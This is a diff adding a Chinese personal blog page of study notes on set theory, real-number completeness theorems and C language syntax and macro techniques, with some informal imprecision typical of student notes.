+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/01/06/%E4%BF%A1%E6%81%AF%E4%B8%8E%E8%AE%A1%E7%AE%97%E7%A7%91%E5%AD%A6%E5%AF%BC%E8%AE%BA%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%BA%8C/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="jpwang">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="jjppp">
+      <meta itemprop="description" content="Young, Simple & Naive">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | jjppp">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2021/01/06/%E4%BF%A1%E6%81%AF%E4%B8%8E%E8%AE%A1%E7%AE%97%E7%A7%91%E5%AD%A6%E5%AF%BC%E8%AE%BA%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%BA%8C/" class="post-title-link" itemprop="url">信息与计算科学导论复习笔记二</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2021-01-06 22:44:00" itemprop="dateCreated datePublished" datetime="2021-01-06T22:44:00+08:00">2021-01-06</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2022-06-19 09:36:58" itemprop="dateModified" datetime="2022-06-19T09:36:58+08:00">2022-06-19</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          ##集合的大小
+有限集合的大小很容易比较，只需要数一数，比一比就完了
+而无限集不能这么做。我们在这里规定集合$A$与$B$大小相等当且仅当存在$f: A\mapsto B$为双射
+
+定理：无限集至少和它的一个真子集有双射
+证明：考虑$A$，由选择公理，我们可以取出$B\subset A$且$B$可数，那么$f:A\mapsto A\backslash B_0$就可以取$f(x)=\left\{\begin{aligned}\begin{equation}B_{i+1}, x=B_i\\x,x\not\in B\end{equation}\end{aligned}\right.$
+
+##康托定理
+集合$S$总是小于它的幂集$2^S$，定义$2^S=\left\{T|T\subset S\right\}$
+这里蕴含了一个幂集公理，即集合的幂集还是集合
+证明：假设存在一个双射$f:S\mapsto 2^S$，那么取$T=\left\{x|x\not\in f(x)\right\}$，显然这个集合不同于任何双射中的值域，这就得到了一个矛盾
+
+这个方法叫对角线法则，很好用~
+
+##可数与不可数
+定义$S$可数(countable)当且仅当$\exists f:\mathbb N\mapsto S$为双射
+
+定理：$\mathbb R$不可数
+证明：这是别处看来的，觉得更好理解一些(虽然没有用到对角线法则)
+这里先只证明$[0,1]$不可数。反证法：假设可数，则存在一种列举方式使得我们能穷尽所有的实数，记这个数列为$\left\{a_n\right\}$
+那么对于$a_0$，我们可以把区间划分为$[0,\frac{1}{3}],[\frac{1}{3},\frac{2}{3}],[\frac{2}{3},1]$，则至多有两个区间包含了$a_0$，取剩下的那个区间为下一次的操作区间，重复上述过程
+这样我们就得到了一系列区间套，最终会收敛到一个点$\xi$
+$\xi\in\mathbb R$，但是$\forall i$都有$a_i\neq \xi$，这样就推出了矛盾
+
+##Cantor-Bernstein定理
+其实还有一个名字的，不会写……
+这个定理很直观：若$|A|\le|B|$且$|B|\le|A|$则$|A|=|B|$
+证明用到了巴拿赫定理
+
+##Banach定理
+若存在$f:A\mapsto B$和$g:B\mapsto A$都是单射，则
+存在$A_0,A_1$满足$A_0\cap A_1=\varnothing$，$A_0\cup A_1=A$
+存在$B_0,B_1$满足$B_0\cap B_1=\varnothing$，$B_0\cup B_1=B$
+使得$f\left(A_0\right)=B_1$，$g\left(B_0\right)=A_1$
+证明有点长，先去吃个饭~
+
+
+剩下的内容可以看之前写过的集合大小比较的文章，差不多都齐了……
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2021/01/06/%E4%BF%A1%E6%81%AF%E4%B8%8E%E8%AE%A1%E7%AE%97%E7%A7%91%E5%AD%A6%E5%AF%BC%E8%AE%BA%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%BA%8C/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/01/06/%E4%BF%A1%E6%81%AF%E4%B8%8E%E8%AE%A1%E7%AE%97%E7%A7%91%E5%AD%A6%E5%AF%BC%E8%AE%BA%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%80/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="jpwang">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="jjppp">
+      <meta itemprop="description" content="Young, Simple & Naive">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | jjppp">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2021/01/06/%E4%BF%A1%E6%81%AF%E4%B8%8E%E8%AE%A1%E7%AE%97%E7%A7%91%E5%AD%A6%E5%AF%BC%E8%AE%BA%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%80/" class="post-title-link" itemprop="url">信息与计算科学导论复习笔记一</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2021-01-06 22:43:00" itemprop="dateCreated datePublished" datetime="2021-01-06T22:43:00+08:00">2021-01-06</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2022-06-19 09:47:11" itemprop="dateModified" datetime="2022-06-19T09:47:11+08:00">2022-06-19</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          信息与计算科学导论一
+
+##罗素悖论
+考虑这么一个集合：
+$S=\left\{T|T\not\in S\right\}$
+考虑一个集合内的元素$x$，若$x\in S$，则根据定义$x\not\in S$，矛盾
+若$x\not\in S$，则根据定义有$x\in S$，矛盾
+我们找不到这样一个集合，这就是大名鼎鼎的罗素悖论
+
+##公理集合论
+悖论的源头在于构建集合的描述性方法，我们在使用这个方法的时候出现了所谓“自引用”的情况
+为了体系的和谐与自洽，数学家们提出了公理集合论，创造了“类”(class)的概念。
+一个集合是一个类，但是所有的类不都是集合。对于那些不是集合的类我们称之为真类(proper class)
+可以存在set的set但是不能存在class的class，这样就可以比较和谐地处理一些问题了
+
+关于公理集合论的的具体内容可以看wiki，这里给了一个比较重要的公理——正则公理
+若$S$为一集合，要么$S=\varnothing$，要么$\exists x\in S$使得$x\cap S=\varnothing$
+这排除了一些看起来是集合然而不太和谐的真类，比如说$\left\{\left\{\left\{\dots\right\}\right\}\right\}$
+
+例子：不存在集合$A$，$B$使得$A\in B$且$B\in A$
+证明：假设存在集合，由集合公理得到$\left\{A,B\right\}$也是一个集合，这个集合与正则公理矛盾
+
+例子：不存在$\left\{S_0,S_1,S_2,\dots\right\}$使得$\forall i\in\mathbb N$都有$S_i\in S_{i+1}$
+证明：和上面的例子类似，反证然后用正则公理推出矛盾
+
+##集合运算
+然后介绍了差集(set difference)的概念，即$A\backslash B=A\backslash \left(A\cap B\right)=A\cap \overline B$
+差集没有交换律，考虑这个例子：$A\cap B=\varnothing$，显然$A\backslash B\neq B\backslash A$
+差集也没有结合律，考虑这个：$A\cap B\neq \varnothing$，$A\neq B=C$，则显然$A\backslash\left(B\backslash C\right)\neq\left(A\backslash B\right)\backslash C$
+
+然后介绍了De Morgan Law：$A\backslash\left(B\cup C\right)=\left(A\backslash B\right)\cap\left(A\backslash C\right)$
+证明：考虑用上面差集定义，那么$A\backslash\left(B\cup C\right)=A\cap\left({\overline{B\cup C} }\right)=A\cap\left({\overline B\cap\overline C}\right)\\=\left(A\cap\overline B\right)\cap\left(A\cap\overline C\right)=\left(A\backslash B\right)\cap\left(A\backslash C\right)$
+当然证明左右互相为对面的子集也是可以的
+
+接下来引入了笛卡尔积(cartesian product)的概念
+定义$A\times B=\left\{\left(x,y\right)|x\in A, y\in B\right\}$
+其中$\left(x,y\right)$是一个有序二元组(tuple)，它的集合定义是$\left\{x,\left\{x,y\right\}\right\}$或$\left\{\left\{\varnothing, \left\{x\right\}\right\},\left\{\left\{y\right\}\right\}\right\}$
+
+但是n元组却不能简单地类似定义，例如$\left(x,\left(y,z\right)\right)$和$\left(\left(x,y\right),z\right)$是等价的3元组，但是在这种嵌套方式下它们不等价，所以很多时候数学的表达方式都不是最严谨的。。(比如说zhongsheng老湿的lecture notes)
+
+##关系
+定义在集合$A$上的二元关系(binary relation)指$R=A\times A=A^2$，类比还有n元关系
+关系有一下四种性质，不同的关系满足其中一个或多个
+1. 自反性(reflexive)：若$x\in A\Rightarrow\left(x,x\right)\in R$，则称这个关系具有自反性
+2. 对称性(symmetric)：若$\left(x,y\right)\in R\iff \left(y,x\right)\in R$
+3. 反对称性(anti-symmetric)：若$\left(x,y\right)\in R$且$\left(y,x\right)\in R\Rightarrow x=y$
+4. 强反对称性(strongly anti-symmetric)：若$\left(x,y\right)\in R\Rightarrow \left(y,x\right)\not\in R$
+5. 传递性(transitive)：若$\left(x,y\right),\left(y,z\right)\in R\Rightarrow \left(x,z\right)\in R$
+
+##传递闭包
+然后讲了传递闭包，也就是所谓的$Warshall- Floyd$算法，也就是最短路。。
+~~证明思路留坑，反正也不难~~，来填坑了
+$Warshall$算法的过程可以表述如下：
+1. 枚举一个中间元素$k$
+2. 枚举一个元素$i$
+3. 枚举一个元素$j$
+4. 若$\left(i,k\right)\in R$且$\left(k,j\right)\in R$，则将$\left(i,j\right)$加入$R$
+5. 最后得到的$R=R^\star$
+
+由于$k$是递增的，我们就可以根据$k$来归纳。我们说一条路径$< a , b >$指的是$\left(a,c_1\right),\left(c_1,c_2\right),\dots,\left(c_m,b\right)$这样首尾相连的关系链，再定义$k$-路径为除了首尾以外的点编号都不超过k的路径，记为$< a, b >_k$
+
+那么第0次循环时，所有的路径都是0-路径，这个很简单
+假设做到了第k+1次循环，那么对于$R^\star$中的关系有两种情况：
+1. 这条路径上的最大点小于k+1，那么这条路径已经在前面的循环中被找出来加入$R$了
+2. 这条路径上的最大点恰好等于k+1，那么此时从k+1处断开，剩下的两条链都已经在前面的循环中被加入了$R$，于是这里可以一步做完
+3. 大于k+1，什么都没有发生……
+
+
+
+
+##等价类的概念
+如果一个集合$X$上的二元关系是自反的、对称的、传递的，那么这个关系就可以被称为一个等价关系(equivalence relation)
+定理：集合$X$上的一个等价关系提供了$X$的一个划分(partition)
+称$X$的一个划分为$Y$，当且仅当$\forall x,y\in Y$都有$x\cap y=\varnothing$，且$\cup Y=X$
+
+若两个元素有等价关系，则我们称它们属于同一个等价类(equivalent class)
+
+
+证明：首先由自反性可知等价关系至少包含了所有元素，因此只需要证明这些等价类不相交就可以了
+反证法：假设存在一个元素$z$同时属于等价类$X$和$Y$且$X\neq Y$
+任取$x\in X,y\in Y$，则$\left(x,z\right)\in R$且$\left(y,z\right)\in R$，由传递性可知$\left(x,y\right)\in R$，即$X=Y$，矛盾
+
+##函数
+接下来是函数基于二元关系的新定义。即$f: A\mapsto D$可以理解为$A\times D$的一个子集，满足每个A(定义域)中的元素只出现了一次
+
+单射(injective)、双射(bijective)、满射(surjective)都很好理解，不说
+函数的复合、求逆也很好理解，只需要注意复合运算的顺序就行了
+
+再然后介绍了函数的函数(算子、泛函)的概念，提了一嘴函数式编程(functional programming)，只要知道lambda验算和图灵机是等价的应该就行了
+需要注意的是，计算一个函数有时候是一件很难的事情(难以找到确定关系、复杂度不可接受)
+
+还有非确定函数的概念(functionality)，这个在密码学中运用的比较广泛。比如给出一个输入$L$，输出一个长度为$L$的随机二进制串使得它满足一定的概率分布等等
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2021/01/06/%E4%BF%A1%E6%81%AF%E4%B8%8E%E8%AE%A1%E7%AE%97%E7%A7%91%E5%AD%A6%E5%AF%BC%E8%AE%BA%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%80/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/01/01/%E6%95%B0%E5%AD%A6%E5%88%86%E6%9E%90%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0-%E5%AE%9E%E6%95%B0%E5%AE%8C%E5%A4%87%E6%80%A7%E7%9A%84%E5%85%AD%E4%B8%AA%E5%AE%9A%E7%90%86/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="jpwang">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="jjppp">
+      <meta itemprop="description" content="Young, Simple & Naive">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | jjppp">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2021/01/01/%E6%95%B0%E5%AD%A6%E5%88%86%E6%9E%90%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0-%E5%AE%9E%E6%95%B0%E5%AE%8C%E5%A4%87%E6%80%A7%E7%9A%84%E5%85%AD%E4%B8%AA%E5%AE%9A%E7%90%86/" class="post-title-link" itemprop="url">数学分析复习笔记 实数完备性的六个定理</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2021-01-01 14:26:00" itemprop="dateCreated datePublished" datetime="2021-01-01T14:26:00+08:00">2021-01-01</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2022-06-19 09:47:11" itemprop="dateModified" datetime="2022-06-19T09:47:11+08:00">2022-06-19</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          实数完备性的几个定理可以互相推导，这里给出了一个比较简单的完整推导链条
+对于没有写到的推导可以通过旁敲侧击推导出这里的条件再继续（迂回战术）
+
+# 1. 有界必有确界
+---
+如果$\exists u$使得$\forall x\in S$都有$x\le u$,那么$S$有上确界
+上确界：记$U=\sup\left\{S\right\}$，则$\forall x\in S$都有$x\le U$，且$\forall \epsilon>0$，$\exists x_0\in S$使得$x_0>U-\epsilon$
+
+## 用有限区间覆盖证明
+---
+$S$存在最大值的情况非常显然，它的上确界就是最大值；后文只讨论$S$不存在最大值的情况
+
+反证法，假设$S$有界而没有上确界，记$S$上界的集合为$\overline U$
+则可以取$S$中的一个元素$L$，$\overline U$中的一个元素$R$，得到一个闭区间$\left[L,R\right]$
+考虑$x\in [L,R]$，分成如下几种情况：
+1. $x\in\overline U$
+2. $x\in S$
+3. $x\not\in S$且$x\not\in\overline U$
+
+对于情况1,由假设我们一定可以找到$x'\in\overline U$且$x'< x$，使得$x'$也是一个上界
+此时我们为点$x$造一个开区间$\left(x',2x-x'\right)$，这个区间内的点都**是**$S$的上界
+
+对于情况2,由$S$不存在最大值可知我们一定能找到$x'\in S$且$x'>x$
+此时我们为点x造一个开区间$\left(2x-x',x'\right)$，这个区间内的点都**不是**$S$的上界
+
+对于情况3,由x不是上界可知，必存在一个$x' \in S$使得 $x < x' $，此时情况同2
+
+于是我们为闭区间内的每一个点都配了一个开区间，这个开区间的集合覆盖了闭区间内的每一个点，由有限覆盖定理可知存在有限个开区间覆盖了$[L,R]$
+
+引理1:开覆盖中相邻两个开区间必相交
+证明：假设存在不相交的开覆盖，则存在点未被覆盖，矛盾
+
+由引理1可知$[L,R]$上的开覆盖一定是环环相套的，从左起每一个开区间内的点都不是上界，从右起每一个开区间内的点都是上界，则可以推得中间存在一个开区间同时满足这两种情况(这是不可能的)，推得矛盾。于是原命题成立
+
+# 2. 单调有界收敛
+---
+若数列$\left\{a_n\right\}$单调递增且有上界，则该数列收敛(存在极限)
+
+## 用确界存在证明
+---
+有上界必有上确界，记$U=\sup\left\{a_n\right\}$，则根据定义有$\forall n\left(U\ge a_n\right)$且$\forall \epsilon>0,\exists n_0$，有$U-\epsilon < a_{n_0}$
+
+又$\left\{a_n\right\}$递增，于是取$N=n_0$，当$n\ge N$，有$U-\epsilon < a_{n_0}\le a_n \le U < U+\epsilon$，这个就是数列收敛的定义，且恰好收敛于$U$
+# 3. 闭区间套
+---
+考虑一个初始闭区间$[L_0,R_0]$，我们取一系列闭区间$[L_1,R_1],[L_2,R_2],\dots$满足$[L_1,R_1]\subset[L_2,R_2]\subset\dots$
+且有$\lim\limits_{i\rightarrow +\infty}{\left(R_i-L_i\right)}=0$
+则$\cap{[L_i,R_i]}=\xi$，收敛于一个点
+
+## 用单调有界收敛证明
+---
+由第一个条件可知，$\left\{L_n\right\}$单调递增，且有上界$R_0$，于是数列收敛
+同理$\left\{R_n\right\}$也收敛，下面证明两个极限相等。
+反证法：假设左右极限不相等，则$\cap[L_i,R_i]=[\sup\left\{L_n\right\},\inf\left\{R_n\right\}]$，与条件2矛盾，故假设不成立
+
+然后就做完了
+# 4. 聚点
+---
+无穷项有界数列必有收敛子数列
+
+## 用闭区间套证明
+---
+因为有界，必可以找到上下界，记值域区间为$[L_0,R_0]$
+取中点$M=\frac{L_0+R_0}{2}$，则左右两个区间中，必存在至少一个区间包含了数列的无限项，记这个新的区间为$[L_1,R_1]$
+重复上述过程，则我们构造出了一个闭区间套，由闭区间套定理可知这个区间会收敛到一个点$\xi$上，那么每次任意取$x_i\in[L_i,R_i]$就可以得到一个收敛的子数列
+# 5. 有限覆盖
+---
+考虑一个由若干开区间构成的集合$I$，若$[L,R]\subset\cup I$，则一定可以从$I$中取出有限个开区间覆盖整个闭区间$[L,R]$
+
+## 用闭区间套证明
+---
+反证法：假设不能用有限个开区间覆盖$[L,R]$，则取$M=\frac{L+R}{2}$，左右两半至少有一个闭区间被无限个开区间覆盖
+反复上述操作，则我们构造了一个闭区间套。且这个闭区间的长度可以任意小。而开区间集合中任意一个覆盖了$\xi$的开区间长度都确定，得到矛盾，故假设不成立
+
+
+# 6. 柯西收敛
+---
+数列收敛的充要条件是
+$\forall \epsilon > 0$，$\exists N$，$\forall x,y\ge N$都有$|a_x-a_y|\le \epsilon$
+可以发现这个判别法则和具体的极限无关，只关心数列本身的性质
+
+## 用聚点证明
+---
+必要性比较简单，这里只证明充分性
+先证明柯西数列有界。取$\epsilon=1$，则$\max\left\{a_1,a_2,\dots,a_{N_{\epsilon} },a_{N_{\epsilon} }+1\right\}$是数列的一个上界，下界同理
+
+有界数列必有收敛子数列，记子数列为$a_{n_1},a_{n_2},a_{n_3},\dots$，其极限为$A$，
+则$\forall \epsilon >0$, $\exists K >0$，当$k> K$时$|a_{n_k}-A|\le \epsilon$
+根据定义，取$N'=\max\left\{n_K,N\right\}$，令$x=N'$，则$\forall y> N'$都有$|a_y-A|=|a_y-a_x+a_x-A|\le|a_y-a_x|+|a_x-A|\le2\epsilon$
+
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2021/01/01/%E6%95%B0%E5%AD%A6%E5%88%86%E6%9E%90%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0-%E5%AE%9E%E6%95%B0%E5%AE%8C%E5%A4%87%E6%80%A7%E7%9A%84%E5%85%AD%E4%B8%AA%E5%AE%9A%E7%90%86/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2020/12/27/C%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="jpwang">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="jjppp">
+      <meta itemprop="description" content="Young, Simple & Naive">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | jjppp">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2020/12/27/C%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" class="post-title-link" itemprop="url">C语言学习笔记</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2020-12-27 00:08:00" itemprop="dateCreated datePublished" datetime="2020-12-27T00:08:00+08:00">2020-12-27</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2022-06-19 09:36:58" itemprop="dateModified" datetime="2022-06-19T09:36:58+08:00">2022-06-19</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          更新：因为开始写PA2了，因此决定重回这个坑，顺便记录一下解决一些C问题的方法，不一定和语法相关
+
+---
+
+现在才知道 oi 用的是 C-with-STL... 感觉自己对这个看起来很单纯的语言仍然不够了解
+
+打算仔仔细细地写一写自己不太会的东西，包括与 C++ 不同的语法、宏(macro)的技巧、指针的技巧等等
+
+
+# 语法
+
+## `enum`
+
+可以利用`enum`的特点来引入最大下标开数组
+
+```
+enum {PC,R1,R2,...,R7,R_SIZE};
+
+```
+
+那么这里的`R_SIZE`天然就是最大下标
+
+## 数组初始化
+
+简单的就不说了。通常会有这样的情形：我们需要一个lookup-table，并且希望这是const的
+
+dom的范围很大，但是实际上有用的lookup项很少(比如说为每个二元运算分配一个优先级)
+那么就可以这么写
+
+```c
+enum TOKENS {
+	// blah blah blah....
+} ;
+
+// priority for _binary operators_
+static const int priority[512] = {
+  [TK_OR] = 4,
+  
+  [TK_AND] = 5,
+  
+  [TK_NEQ] = 9,
+  [TK_EQ] = 9,
+  
+  [TK_LEQ] = 10,
+  [TK_GEQ] = 10,
+  [TK_LT] = 10,
+  [TK_GT] = 10,
+  
+  ['+'] = 12,
+  ['-'] = 12,
+  
+  ['*'] = 13,
+  ['/'] = 13,
+  ['%'] = 13,
+};
+```
+
+## struct
+
+struct里面不能有函数(好严格..) 
+
+C语言中的结构体有两种定义方式
+
+```c
+struct MyStruct {
+      int tmp;
+} ;
+
+struct MyStruct a;
+```
+
+或者可以
+
+```c
+typedef struct tmpMyStruct {
+    tmpMyStruct *p;
+    int tmp;
+} MyStruct;
+
+MyStruct a;
+```
+
+这两者的区别在于下面的方法把`struct`定义为一个类型，并且引入了一个中间名字`tmpStruct`，这使得我们可以在结构体中定义结构体变量(考虑一个指针节点的组成)
+
+
+
+## `malloc`/`free`
+
+C++用的更多的是`new`和`delete`，C里面用的是`malloc`和`free`
+假设有这么一个
+
+```c
+typedef struct tmpNode {
+      struct tmpNode *next;
+      int value;
+} Node;
+
+Node *head;
+```
+
+我们要给`head`指针分配内存空间，用的就是
+
+```c
+head = (Node*) malloc(sizeof(Node));
+```
+
+这个可以类比给`Node`类`new`了一个对象，不带初始化函数
+这里分配的内存不包括结构体内部指针指向的地址的内存，这个还需要在自己写的初始化函数里再`malloc`一次
+
+一个我常用的小技巧是把初始化函数自己实现一遍，返回一个对象的指针
+
+类似的，在`free`的时候需要自己实现对象的析构：比如说`free`一棵红黑树，比如说`free`一个链表。通常递归`free`掉所有节点就够了
+
+
+
+## `const` 数组下标
+
+C语言中const修饰的int变量不能定义数组大小，因为这是一个只读变量而不是常量，通常我们会用#define
+
+
+
+## bool
+
+C里面的bool是在C99以后才有的，如果要用true和false需要引用stdbool.h，或者自己define
+
+
+
+## 逗号表达式
+
+逗号的优先级最低，一段逗号表达式按顺序从左到右求值，一整段逗号表达式的值由最右边的式子决定
+比如说`(a = 3, a *= 2)`的值就是`6`
+
+
+
+## `static`静态变量
+
+分为全局静态变量和局部静态变量。静态变量放在`.bss`或`.data`字段中
+
+全局静态变量在链接的时候不能被其他`.o`文件引用，可以看成是一种`private`封装
+局部静态变量不在栈上，作用域和局部变量一致，生命周期却和全局变量一致
+
+## `volatile`关键字
+
+这个是看CSAPP学到的姿势
+
+对于多线程共同访问一个全局变量的情况，可以使用`volatile`来告诉编译器对于该变量只从内存中取值
+
+这可以防止编译器过度优化使得无锁并行的程序出错
+
+
+# macro
+
+## 未定义`macro`的初值
+
+考虑如下代码
+
+```c
+#include <stdio.h>
+int main(void) {
+	#if aa==bb
+		puts("YES");
+	#else
+		puts("NO");
+	#endif
+	return 0;
+}
+```
+
+输出是`YES`
+原因在于未定义的`macro`默认值都是`0`
+
+同时 `#if` 后跟着的表达式必须是常亮表达式。很好理解，因为是编译期行为
+
+## `#ifndef`
+
+在多文件编程的时候我们会include若干.h文件。.h文件的include原理就是复制粘贴，因此如果多次include会出现奇奇怪怪的错
+所以我们需要在.h前后加上
+
+```c
+#ifndef _SOMETHINGSPECIAL_
+#define _SOMETHINGSPECIAL_
+// do something ...
+#endif
+```
+
+其中`_SOMETHINGSPECIAL_`是不同头文件不同的一个变量名，这个东西的意思是如果没有定义过这个宏就执行内部内容，否则就跳过。而内部代码定义了这样一个宏，就保证了只会被执行一次(即使被`include`多次)
+
+## stringify和concatenation
+
+假设要实现`float`和`int`的最大值函数
+
+```c
+#define CONCAT_TMP(X, Y) X ## Y
+#define CONCAT(X, Y) CONCAT_TMP(X, Y)
+
+#define DEF_MAX \
+	int		CONCAT(max_, int)(int x,  int y) { return x > y ? x : y;} \
+	float	CONCAT(max_, float)(int x,int y) { return x > y ? x : y;}
+```
+
+
+
+## 多行`macro`&&任意参数
+
+很多时候一行宏定义不够用，于是我们就可以通过在行末加'\'符号定义多行`macro`
+如果出现了参数不明确但是操作一致的情况，我们还可以在定义的时候采用...作为形参，使用的时候用`__VA_ARGS__`这个宏
+
+```c
+#define IS_DEBUG true
+#define DEBUG(...) {\
+if (IS_DEBUG) \
+printf(__VA_ARGS__);\
+}
+
+```
+
+## `while(0)`
+
+一个很怪的用法，大概可以写成下面这样：
+
+```c
+#define CHECK(EXP) do {\
+  if (EXP) printf("WARNING! " #EXP " CHECK FAILED!\n"); } while (0)
+```
+
+这个宏函数会检查一个表达式`EXP`，但是这里把主体语句用一个`do while(0)`括起来了
+好处大概有这么几个：
+
+1. 可以包裹多条语句，在展开之后可以保证这些语句在一个大括号内，这样可以保证操作对于`if then else`的整体性
+2. （新增）这样做的话宏的内部相对独立，就可以随便开临时变量了
+
+
+## X-macro
+
+这个用于解决相关联的表项数据分布于不同文件时，如何方便修改的问题
+
+一个比较烂的的例子是抄来的：
+
+```c
+enum color {RED,GREEN,BLUE};
+char *str[] = {"RED","GREEN","BLUE"};
+```
+
+实际代码中可能不止两处，可能相隔很远
+
+现在如果要在红色和绿色之间加入黄色，那么所有**硬编码**的地方都需要修改
+
+所谓 X macro就是这样一类解决多处硬编码的修改问题
+
+```c
+#define COLOR(X) \
+	X("RED",RED) \
+	X("BLUE",BLUE) \
+	X("GREEN",GREEN)
+
+#define X(a,b) b,
+	enum color {COLOR(X)};
+#undef X
